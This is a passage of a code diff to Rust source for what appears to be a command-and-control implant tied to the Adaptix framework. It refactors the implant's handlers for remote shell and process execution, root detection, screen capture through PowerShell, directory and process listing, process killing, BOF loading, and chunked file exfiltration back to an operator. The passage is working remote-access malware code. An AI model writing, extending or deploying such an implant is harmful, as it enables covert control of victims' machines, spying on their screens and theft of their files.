-                w.write_u8(1); // result = success
-
-                // path + \* suffix (matches beacon convention)
-                let abs_path = format!("{}\\*", dir);
-                w.write_string(&abs_path);
-
-                // Collect entries
-                let mut entry_data: Vec<u8> = Vec::new();
-                let mut count: u32 = 0;
-
-                for entry_result in entries {
-                    let entry = match entry_result {
-                        Ok(e) => e,
-                        Err(_) => continue,
-                    };
-                    let meta = match entry.metadata() {
-                        Ok(m) => m,
-                        Err(_) => continue,
-                    };
-                    let is_dir = meta.is_dir();
-                    let size = meta.len();
-                    let date = meta.modified()
-                        .ok()
-                        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
-                        .map(|d| d.as_secs() as u32)
-                        .unwrap_or(0);
-                    let name = entry.file_name().to_string_lossy().to_string();
-
-                    // Per-entry: [u8 isDir][u64 size][u32 date][string name]
-                    let mut ew = WriterBE::new();
-                    ew.write_u8(if is_dir { 1 } else { 0 });
-                    ew.write_u64(size);
-                    ew.write_u32(date);
-                    ew.write_string(&name);
-                    entry_data.extend_from_slice(&ew.into_bytes());
-                    count += 1;
-                }
-
-                w.write_u32(count);
-                let mut w_bytes = w.into_bytes();
-                w_bytes.extend_from_slice(&entry_data);
-                (Some(w_bytes), 0, 0)
-            }
-        }
-    }
-
-    // ── L2: PS_LIST (empty list) ───────────────────────────────────────────
-
-    protocol::COMMAND_PS_LIST => {
-        let mut w = WriterBE::new();
-        w.write_u8(1);  // result = success
-        w.write_u32(0); // count = 0
-        (Some(w.into_bytes()), 0, 0)
-    }
-
-    // ── L2: GETUID ─────────────────────────────────────────────────────────
-
-    protocol::COMMAND_GETUID => {
-        let username = env::var("USER")
-            .or_else(|_| env::var("USERNAME"))
-            .unwrap_or_default();
-        let domain = env::var("USERDOMAIN").unwrap_or_default();
-        let elevated = {
-            #[cfg(unix)]
-            { unsafe { libc::geteuid() == 0 } }
-            #[cfg(not(unix))]
-            { false }
-        };
-
-        let mut w = WriterBE::new();
-        w.write_u8(if elevated { 1 } else { 0 });
-        w.write_string(&domain);
-        w.write_string(&username);
-        (Some(w.into_bytes()), 0, 0)
-    }
-
-    // ── L2: JOB_LIST (empty) ───────────────────────────────────────────────
-
-    protocol::COMMAND_JOB_LIST => {
-        let mut w = WriterBE::new();
-        w.write_u32(0); // count = 0
-        (Some(w.into_bytes()), 0, 0)
-    }
-
-    // ── L2: JOBS_KILL (not found result) ───────────────────────────────────
-
-    protocol::COMMAND_JOBS_KILL => {
-        let job_id = r.read_u32();
-        let mut w = WriterBE::new();
-        w.write_u8(0);          // result = not found
-        w.write_u32(job_id);
-        (Some(w.into_bytes()), 0, 0)
-    }
-
-    // ── L2: RUN ────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_RUN => {
-        let prog = r.read_string();
-        let args = r.read_string();
-        let task_id = r.read_u32(); // taskId is inside RUN data
-        match start_detached_process(&prog, &args) {
-            Ok(pid) => {
-                let mut w = WriterBE::new();
-                w.write_u32(pid as u32);
-                w.write_u8(0);
-                w.write_string(&prog);
-                (Some(w.into_bytes()), task_id, 0)
-            }
-            Err(_) => (Some(command_error_response(31)), task_id, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L2: SHELL ──────────────────────────────────────────────────────────
-
-    protocol::COMMAND_SHELL => {
-        let cmd_line = r.read_string();
-        match run_shell_command(&cmd_line) {
-            Ok(output) => {
-                let mut w = WriterBE::new();
-                w.write_string(&output);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L2: SCREENSHOT ─────────────────────────────────────────────────────
-
-    protocol::COMMAND_SCREENSHOT => {
-        match capture_screenshot_png() {
-            Ok(img) => {
-                let mut w = WriterBE::new();
-                w.write_bytes(&img);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(_) => (Some(command_error_response(31)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L2: ZIP ────────────────────────────────────────────────────────────
-
-    protocol::COMMAND_ZIP => {
-        let src = r.read_string();
-        let dst = r.read_string();
-        match zip_to_file(&src, &dst) {
-            Ok(()) => {
-                let mut w = WriterBE::new();
-                w.write_string(&dst);
-                (Some(w.into_bytes()), 0, 0)
-            }
-            Err(_) => (Some(command_error_response(31)), 0, protocol::COMMAND_ERROR),
-        }
-    }
-
-    // ── L2: BOF (routes through scaffold loader surface) ───────────────────
-
-    protocol::COMMAND_EXEC_BOF => {
-        let async_exec = r.read_u8() != 0;
-        let _entry = r.read_string();
-        let bof = r.read_bytes();
-        let args = r.read_bytes();
-
-        let result = if async_exec {
-            crate::bof::load_async(&bof, &args)
-        } else {
-            crate::bof::load(&bof, &args)
-        };
-
-        match result {
-            Ok(ctx) => {
-                let msg = ctx.msgs.into_iter().next().unwrap_or(crate::bof::BofMsg {
-                    msg_type: protocol::CALLBACK_OUTPUT_UTF8,
-                    data: b"BOF completed".to_vec(),
-                });
-                (Some(command_output_message(msg.msg_type as u32, &msg.data)), 0, protocol::COMMAND_EXEC_BOF_OUT)
-            }
-            Err(err) => (Some(command_error_string(protocol::CALLBACK_ERROR, &err)), 0, protocol::COMMAND_EXEC_BOF_OUT),
-        }
-    }
-
-    // ── L1: SAVEMEMORY (consume, no response) ──────────────────────────────
-
-    protocol::COMMAND_SAVEMEMORY => {
-        let _memory_id  = r.read_u32();
-        let _total_size = r.read_u32();
-        let _chunk      = r.read_bytes(); // [4B chunkSize][chunkData]
-        (None, 0, 0)
-    }
-
-    // ── Unknown ────────────────────────────────────────────────────────────
-
-    _ => {
-        (None, 0, 0)
-    }
-    }
+fn system_error_response(err: &io::Error) -> Vec<u8> {
+    command_error_response(win32_error_code(err))
 }
 
 fn command_output_message(kind: u32, data: &[u8]) -> Vec<u8> {
@@ -577,16 +670,162 @@ fn command_error_string(kind: u16, message: &str) -> Vec<u8> {
     command_output_message(kind as u32, message.as_bytes())
 }
 
+fn list_directory(path: &str) -> io::Result<(String, Vec<(String, bool, u64, u32)>)> {
+    let abs_path = runtime_fs::normalize_path(path);
+    let abs = fs::canonicalize(&abs_path).unwrap_or(abs_path);
+    let entries = fs::read_dir(&abs)?;
+    let mut out = Vec::new();
+    for entry in entries {
+        let entry = entry?;
+        let meta = entry.metadata()?;
+        let modified = meta
+            .modified()
+            .ok()
+            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
+            .map(|d| d.as_secs() as u32)
+            .unwrap_or(0);
+        out.push((
+            entry.file_name().to_string_lossy().to_string(),
+            meta.is_dir(),
+            meta.len(),
+            modified,
+        ));
+    }
+    Ok((abs.to_string_lossy().to_string(), out))
+}
+
+fn list_disks() -> io::Result<Vec<DiskEntry>> {
+    #[cfg(windows)]
+    {
+        let mut disks = Vec::new();
+        for letter in b'C'..=b'Z' {
+            let root = format!("{}:\\", letter as char);
+            if Path::new(&root).exists() {
+                disks.push(DiskEntry { letter, disk_type: 3 });
+            }
+        }
+        if disks.is_empty() {
+            return Err(io::Error::new(ErrorKind::NotFound, "no logical drives discovered"));
+        }
+        return Ok(disks);
+    }
+    #[cfg(not(windows))]
+    {
+        Ok(vec![DiskEntry { letter: b'/', disk_type: 3 }])
+    }
+}
+
+fn list_processes() -> io::Result<Vec<ProcessEntry>> {
+    #[cfg(windows)]
+    {
+        let output = Command::new("tasklist").args(["/FO", "CSV", "/NH"]).output()?;
+        let mut out = Vec::new();
+        for line in String::from_utf8_lossy(&output.stdout).lines() {
+            let fields = parse_csv_line(line);
+            if fields.len() < 2 {
+                continue;
+            }
+            let Ok(pid) = fields[1].trim_matches('"').parse::<u16>() else {
+                continue;
+            };
+            out.push(ProcessEntry {
+                pid,
+                ppid: 0,
+                session_id: 0,
+                is_arch64: cfg!(target_pointer_width = "64"),
+                elevated: false,
+                domain: env::var("USERDOMAIN").unwrap_or_default(),
+                username: env::var("USERNAME").unwrap_or_default(),
+                name: fields[0].trim_matches('"').to_string(),
+            });
+        }
+        return Ok(out);
+    }
+    #[cfg(not(windows))]
+    {
+        let output = Command::new("ps").args(["-eo", "pid=,ppid=,user=,comm="]).output()?;
+        let mut out = Vec::new();
+        for line in String::from_utf8_lossy(&output.stdout).lines() {
+            let fields: Vec<_> = line.split_whitespace().collect();
+            if fields.len() < 4 {
+                continue;
+            }
+            let Ok(pid) = fields[0].parse::<u16>() else { continue; };
+            let ppid = fields[1].parse::<u16>().unwrap_or_default();
+            out.push(ProcessEntry {
+                pid,
+                ppid,
+                session_id: 0,
+                is_arch64: cfg!(target_pointer_width = "64"),
+                elevated: false,
+                domain: String::new(),
+                username: fields[2].to_string(),
+                name: fields[3].to_string(),
+            });
+        }
+        Ok(out)
+    }
+}
+
+fn kill_process(pid: u32) -> (Option<Vec<u8>>, u32, u32) {
+    #[cfg(windows)]
+    {
+        match Command::new("taskkill").args(["/PID", &pid.to_string(), "/F"]).status() {
+            Ok(status) if status.success() => (Some(Vec::new()), 0, 0),
+            Ok(_) => (Some(command_error_response(WIN_ERR_GEN_FAILURE)), 0, protocol::COMMAND_ERROR),
+            Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+        }
+    }
+    #[cfg(not(windows))]
+    {
+        match Command::new("kill").arg("-9").arg(pid.to_string()).status() {
+            Ok(status) if status.success() => (Some(Vec::new()), 0, 0),
+            Ok(_) => (Some(command_error_response(WIN_ERR_GEN_FAILURE)), 0, protocol::COMMAND_ERROR),
+            Err(err) => (Some(system_error_response(&err)), 0, protocol::COMMAND_ERROR),
+        }
+    }
+}
+
+fn queue_download_sequence(task_id: u32, file_id: u32, path: &str, data: &[u8]) {
+    use crate::async_queue::queue_binary_response;
+
+    let mut start = WriterBE::new();
+    start.write_u32(file_id);
+    start.write_u8(protocol::DOWNLOAD_START as u8);
+    start.write_u64(data.len() as u64);
+    start.write_string(path);
+    queue_binary_response(task_id, protocol::COMMAND_DOWNLOAD, &start.into_bytes());
+
+    let chunk_size = 64 * 1024;
+    for chunk in data.chunks(chunk_size) {
+        let mut cont = WriterBE::new();
+        cont.write_u32(file_id);
+        cont.write_u8(protocol::DOWNLOAD_CONTINUE as u8);
+        cont.write_bytes(chunk);
+        queue_binary_response(task_id, protocol::COMMAND_DOWNLOAD, &cont.into_bytes());
+    }
+
+    let mut finish = WriterBE::new();
+    finish.write_u32(file_id);
+    finish.write_u8(protocol::DOWNLOAD_FINISH as u8);
+    queue_binary_response(task_id, protocol::COMMAND_DOWNLOAD, &finish.into_bytes());
+}
+
 fn start_detached_process(program: &str, args: &str) -> Result<u32, String> {
     let argv = split_args(args);
-    let mut child = Command::new(program)
-        .args(argv)
-        .spawn()
-        .map_err(|err| err.to_string())?;
+    let child = Command::new(program).args(argv).spawn().map_err(|err| err.to_string())?;
     Ok(child.id())
 }
 
-fn run_shell_command(command_line: &str) -> Result<String, std::io::Error> {
+fn start_detached_command_line(command_line: &str) -> Result<u32, String> {
+    #[cfg(windows)]
+    let child = Command::new("cmd").args(["/C", command_line]).spawn().map_err(|err| err.to_string())?;
+    #[cfg(not(windows))]
+    let child = Command::new("/bin/sh").args(["-c", command_line]).spawn().map_err(|err| err.to_string())?;
+    Ok(child.id())
+}
+
+fn run_shell_command(command_line: &str) -> Result<String, io::Error> {
     #[cfg(windows)]
     let output = Command::new("cmd").args(["/C", command_line]).output()?;
     #[cfg(not(windows))]
@@ -609,7 +848,7 @@ fn zip_to_file(src_path: &str, zip_path: &str) -> Result<(), String> {
                 &format!(
                     "Compress-Archive -Force -Path '{}' -DestinationPath '{}'",
                     src_path.replace('\'', "''"),
-                    zip_path.replace('\'', "''")
+                    zip_path.replace('\'', "''"),
                 ),
             ])
             .status()
@@ -617,7 +856,7 @@ fn zip_to_file(src_path: &str, zip_path: &str) -> Result<(), String> {
         if status.success() {
             return Ok(());
         }
-        return Err("Compress-Archive failed".to_string());
+        Err("Compress-Archive failed".to_string())
     }
     #[cfg(not(windows))]
     {
@@ -632,35 +871,97 @@ fn zip_to_file(src_path: &str, zip_path: &str) -> Result<(), String> {
     }
 }
 
-fn split_args(args: &str) -> Vec<String> {
-    args.split_whitespace().map(|s| s.to_string()).collect()
+fn split_args(line: &str) -> Vec<String> {
+    let mut args = Vec::new();
+    let mut current = String::new();
+    let mut in_quotes = false;
+    let mut escape = false;
+    for ch in line.chars() {
+        if escape {
+            current.push(ch);
+            escape = false;
+            continue;
+        }
+        match ch {
+            '\\' => escape = true,
+            '"' => in_quotes = !in_quotes,
+            c if c.is_whitespace() && !in_quotes => {
+                if !current.is_empty() {
+                    args.push(std::mem::take(&mut current));
+                }
+            }
+            _ => current.push(ch),
+        }
+    }
+    if !current.is_empty() {
+        args.push(current);
+    }
+    args
+}
+
+fn parse_csv_line(line: &str) -> Vec<String> {
+    let mut fields = Vec::new();
+    let mut current = String::new();
+    let mut in_quotes = false;
+    for ch in line.chars() {
+        match ch {
+            '"' => {
+                in_quotes = !in_quotes;
+                current.push(ch);
+            }
+            ',' if !in_quotes => {
+                fields.push(std::mem::take(&mut current));
+            }
+            _ => current.push(ch),
+        }
+    }
+    fields.push(current);
+    fields
 }
 
 fn capture_screenshot_png() -> Result<Vec<u8>, String> {
     #[cfg(windows)]
     {
-        let stamp = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .map_err(|err| err.to_string())?
-            .as_nanos();
+        let stamp = SystemTime::now().duration_since(UNIX_EPOCH).map_err(|err| err.to_string())?.as_nanos();
         let path = env::temp_dir().join(format!("adaptix-shot-{stamp}.png"));
         let path_str = path.to_string_lossy().replace('\'', "''");
         let script = format!(
             "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $bmp.Save('{path_str}', [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()"
         );
-        let status = Command::new("powershell")
-            .args(["-NoProfile", "-Command", &script])
-            .status()
-            .map_err(|err| err.to_string())?;
+        let status = Command::new("powershell").args(["-NoProfile", "-Command", &script]).status().map_err(|err| err.to_string())?;
         if !status.success() {
             return Err("powershell screenshot command failed".to_string());
         }
         let data = fs::read(&path).map_err(|err| err.to_string())?;
         let _ = fs::remove_file(&path);
-        return Ok(data);
+        Ok(data)
     }
     #[cfg(not(windows))]
     {
         Err("screenshot capture is not available on this platform in the Rust scaffold".to_string())
+    }
+}
+
+fn tunnel_status_payload(tunnel_type: u32, result: u32) -> Vec<u8> {
+    let mut w = WriterBE::new();
+    w.write_u32(tunnel_type);
+    w.write_u32(result);
+    w.into_bytes()
+}
+
+fn win32_error_code(err: &io::Error) -> u32 {
+    match err.kind() {
+        ErrorKind::NotFound => WIN_ERR_FILE_NOT_FOUND,
+        ErrorKind::PermissionDenied => WIN_ERR_ACCESS_DENIED,
+        _ => WIN_ERR_GEN_FAILURE,
+    }
+}
+
+fn win32_like_net_error(err: &io::Error) -> u32 {
+    match err.kind() {
+        ErrorKind::TimedOut => WIN_ERR_TIMED_OUT,
+        ErrorKind::ConnectionRefused => WIN_ERR_CONN_REFUSED,
+        ErrorKind::ConnectionAborted | ErrorKind::ConnectionReset | ErrorKind::NotConnected | ErrorKind::BrokenPipe => WIN_ERR_HOST_UNREACH,
+        _ => win32_error_code(err),
     }
 }
